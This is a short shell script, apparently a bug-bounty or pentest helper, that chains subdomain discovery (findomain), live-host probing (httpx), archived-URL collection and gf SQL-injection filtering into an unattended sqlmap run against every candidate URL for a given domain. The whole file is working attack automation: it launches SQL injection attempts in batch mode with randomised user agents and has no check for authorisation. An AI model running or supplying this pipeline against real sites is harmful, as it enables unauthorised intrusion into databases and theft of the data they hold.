#!/bin/sh

mkdir $1 
cd $1
findomain -t $1 -q | httpx-toolkit -silent -mc 200 | anew | getallurls | grep $1 | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
